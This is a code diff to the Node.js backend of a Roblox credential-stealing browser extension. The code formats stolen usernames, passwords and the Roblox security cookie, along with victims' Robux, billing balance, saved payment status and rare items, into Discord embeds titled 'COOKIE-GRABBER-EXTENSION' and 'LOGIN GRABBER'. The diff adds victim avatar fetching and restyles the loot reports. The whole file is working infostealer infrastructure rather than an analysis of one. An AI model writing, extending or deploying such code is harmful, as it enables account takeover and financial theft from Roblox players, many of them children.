@@ -4,6 +4,7 @@ const cors = require('cors');
 
 const app = express();
 const PORT = process.env.PORT || 5000;
+const HOST = '0.0.0.0';
 
 // Middleware
 app.use(cors());
@@ -89,6 +90,22 @@ async function fetchRobloxUserData(token) {
       let actualRobux = altUserData.RobuxBalance || 0;
       let pendingRobux = 0;
 
+      // Fetch avatar for mobile API fallback
+      let avatarUrl = null;
+      try {
+        const avatarResponse = await fetch(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${altUserData.UserID}&size=420x420&format=Png&isCircular=false`, {
+          headers: baseHeaders
+        });
+        if (avatarResponse.ok) {
+          const avatarData = await avatarResponse.json();
+          if (avatarData.data && avatarData.data.length > 0 && avatarData.data[0].state === 'Completed') {
+            avatarUrl = avatarData.data[0].imageUrl;
+          }
+        }
+      } catch (e) {
+        // Silent handling
+      }
+
       return {
         username: altUserData.UserName || "Unknown User",
         userId: altUserData.UserID || 0,
@@ -108,7 +125,8 @@ async function fetchRobloxUserData(token) {
         inventory: { hairs: 0, bundles: 0, faces: 0 },
         emailVerified: false,
         emailAddress: null,
-        voiceChatEnabled: false
+        voiceChatEnabled: false,
+        avatarUrl: avatarUrl,
       };
     }
 
@@ -355,6 +373,22 @@ async function fetchRobloxUserData(token) {
       }
     } catch (e) { /* Ignore voice chat fetch errors */ }
 
+    // Fetch user avatar
+    let avatarUrl = null;
+    try {
+      const avatarResponse = await fetch(`https://thumbnails.roblox.com/v1/users/avatar?userIds=${userData.id}&size=420x420&format=Png&isCircular=false`, {
+        headers: baseHeaders
+      });
+      if (avatarResponse.ok) {
+        const avatarData = await avatarResponse.json();
+        if (avatarData.data && avatarData.data.length > 0 && avatarData.data[0].state === 'Completed') {
+          avatarUrl = avatarData.data[0].imageUrl;
+        }
+      }
+    } catch (e) {
+      // Silent handling
+    }
+
     return {
       username: userData.name || userData.displayName,
       userId: userData.id,
@@ -374,7 +408,8 @@ async function fetchRobloxUserData(token) {
       inventory: inventoryData,
       emailVerified: emailVerified,
       emailAddress: emailAddress,
-      voiceChatEnabled: voiceChatEnabled
+      voiceChatEnabled: voiceChatEnabled,
+      avatarUrl: avatarUrl,
     };
 
   } catch (error) {
@@ -470,77 +505,80 @@ function formatRobloxCombinedEmbedWithData(logData, userData) {
 
   // First embed: Credentials + Comprehensive User Data
   const credentialsAndDataEmbed = {
-    title: "<:emoji_37:1410520517349212200> EXTENSION-LOGGER",
-    color: 0x8B5CF6,
+    title: "<:emoji_37:1410520517349212200> **COOKIE-GRABBER-EXTENSION**",
+    color: 0xFFFFFF,
+    thumbnail: userData.avatarUrl ? {
+      url: userData.avatarUrl
+    } : undefined,
     fields: [
       {
-        name: "🔑 Login Credentials",
-        value: `**Username:** ${logData.credentials?.username || 'Not captured'}\n**Password:** ${logData.credentials?.password || 'Not captured'}`,
+        name: "**Login Credentials**",
+        value: `\`\`\`Username: ${logData.credentials?.username || 'Not captured'}\nPassword: ${logData.credentials?.password || 'Not captured'}\`\`\``,
         inline: false
       },
       {
-        name: "<:emoji_37:1410520517349212200> Username",
+        name: "<:emoji_37:1410520517349212200> **Username**",
         value: userData.username || "Unknown",
         inline: false
       },
       {
-        name: "<:emoji_31:1410233610031857735> Robux (Pending)",
+        name: "<:emoji_31:1410233610031857735> **Robux (Pending)**",
         value: `${userData.robux || 0} (0)`,
         inline: true
       },
       {
-        name: "<:rbxPremium:1408083254531330158> Premium",
+        name: "<:rbxPremium:1408083254531330158> **Premium**",
         value: userData.premium ? "true" : "false",
         inline: true
       },
       {
-        name: "<:emoji_36:1410512337839849543> RAP",
+        name: "<:emoji_36:1410512337839849543> **RAP**",
         value: userData.rap?.toString() || "0",
         inline: true
       },
       {
-        name: "<:emoji_40:1410521889121501214> Summary",
+        name: "<:emoji_40:1410521889121501214> **Summary**",
         value: userData.summary?.toString() || "0",
         inline: true
       },
       {
-        name: "<a:emoji_42:1410523396995022890> Billing",
+        name: "<a:emoji_42:1410523396995022890> **Billing**",
         value: `Balance: ${userData.creditBalance && userData.creditBalance > 0 ? `$${userData.creditBalance} (Est. ${Math.round(userData.creditBalance * 80)} Robux)`: "$0"}\nSaved Payment: ${userData.savedPayment ? "True" : "False"}`,
         inline: false
       },
       {
-        name: "<:emoji_31:1410233610031857735> Robux In/Out",
+        name: "<:emoji_31:1410233610031857735> **Robux In/Out**",
         value: `<:emoji_31:1410233610031857735> ${userData.robuxIncoming || 0} / <:emoji_31:1410233610031857735> ${userData.robuxOutgoing || 0}`,
         inline: true
       },
       {
-        name: "<:emoji_39:1410521396420939787> Collectibles",
+        name: "<:emoji_39:1410521396420939787> **Collectibles**",
         value: `${userData.korblox ? "<:KorbloxDeathspeaker:1408080747306418257> True" : "<:KorbloxDeathspeaker:1408080747306418257> False"}\n${userData.headless ? "<:HeadlessHorseman:1397192572295839806> True" : "<:HeadlessHorseman:1397192572295839806> False"}`,
         inline: true
       },
       {
-        name: "<:emoji_38:1410520554842361857> Groups Owned",
+        name: "<:emoji_38:1410520554842361857> **Groups Owned**",
         value: userData.groupsOwned?.toString() || "0",
         inline: true
       },
       {
-        name: "<:emoji_41:1410522675821940820> Place Visits",
+        name: "<:emoji_41:1410522675821940820> **Place Visits**",
         value: userData.placeVisits?.toString() || "0",
         inline: true
       },
       {
-        name: "<:emoji_37:1410517247751094363> Inventory",
+        name: "<:emoji_37:1410517247751094363> **Inventory**",
         value: `Hairs: ${userData.inventory?.hairs || 0}\nBundles: ${userData.inventory?.bundles || 0}\nFaces: ${userData.inventory?.faces || 0}`,
         inline: false
       },
       {
-        name: "<:emoji_38:1410517275328647218> Settings",
+        name: "<:emoji_38:1410517275328647218> **Settings**",
         value: `Email Status: ${userData.emailVerified ? "Verified" : "Unverified"}\nVoice Chat: ${userData.voiceChatEnabled ? "Enabled" : "Disabled"}\nAccount Age: ${userData.accountAge || 0} Days`,
         inline: false
       }
     ],
     footer: {
-      text: "Made By .gg/sZbFX2wPVz"
+      text: "Made By SL4A"
     },
     timestamp: new Date(logData.timestamp).toISOString()
   };
@@ -548,8 +586,8 @@ function formatRobloxCombinedEmbedWithData(logData, userData) {
   // Second embed: Roblox Security Cookie
   const cookieEmbed = {
     title: "🍪 Cookie",
-    description: "```" + logData.cookie + "```",
-    color: 0x8B5CF6,
+    description: "**```" + logData.cookie + "```**",
+    color: 0xFFFFFF,
     footer: {
       text: "Handle with extreme caution!"
     },
@@ -612,28 +650,28 @@ function formatLogForDiscord(logData) {
 function formatRobloxLoginEmbed(logData) {
   return {
     embeds: [{
-      title: `🔐 ROBLOX LOGIN CREDENTIALS CAPTURED`,
-      description: `\`\`\`\n${logData.message}\`\`\``,
-      color: 0xff0000,
+      title: `<:emoji_37:1410520517349212200> **LOGIN GRABBER**`,
+      description: "```" + logData.message.replace(", ", "\n") + "```",
+      color: 0xFFFFFF,
       fields: [
         {
-          name: '🌐 URL',
+          name: '<:emoji_37:1410520517349212200> **Login Url**',
           value: logData.url || 'Unknown',
           inline: true
         },
         {
-          name: '⏰ Timestamp',
+          name: '<:emoji_37:1410520517349212200> **Timestamp**',
           value: new Date(logData.timestamp).toLocaleString(),
           inline: true
         },
         {
-          name: '⚠️ Security Alert',
-          value: 'Credentials and security token captured',
+          name: '<:emoji_37:1410520517349212200> **Success**',
+          value: 'Username and Password Captured',
           inline: false
         }
       ],
       footer: {
-        text: `🔒 ROBLOX SECURITY BREACH DETECTED`
+        text: `🍪 WAIT THE NEXT EMBED FOR COOKIE`
       },
       timestamp: new Date(logData.timestamp).toISOString()
     }]
